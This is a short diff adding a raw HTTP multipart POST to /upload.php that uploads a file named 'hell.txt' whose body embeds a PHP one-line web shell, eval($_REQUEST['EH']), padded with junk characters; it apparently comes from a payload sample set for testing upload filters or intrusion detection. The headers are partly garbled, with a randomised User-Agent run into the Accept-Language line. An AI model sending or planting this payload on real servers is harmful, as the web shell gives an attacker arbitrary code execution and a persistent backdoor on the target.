@@ -1,0 +1,13 @@
+POST /upload.php HTTP/1.1
+Host: 127.0.0.1
+Accept: */*
+Accept-Language: zh User-Agent: MQQBrowser/4.6 (Windows NT 7.3; Windows NT 5.4; AppleWebKit/5.4.6 Version/ 6.8)  Presto/9.7.3 Version/9 8.7
+Content-Type: multipart/form-data; boundary=----GeVCWHESNYJtQJWljzbZfDclol
+Content-Length: 225
+Connection: close
+
+------GeVCWHESNYJtQJWljzbZfDclol
+Content-Disposition: form-data; name="username"; filename="hell.txt"
+
+18694VW<?php  eval($_REQUEST['EH'])?><? A73(,)#\u00a5%64jf\u2026\u2026&*\uff081yu
+------GeVCWHESNYJtQJWljzbZfDclol--
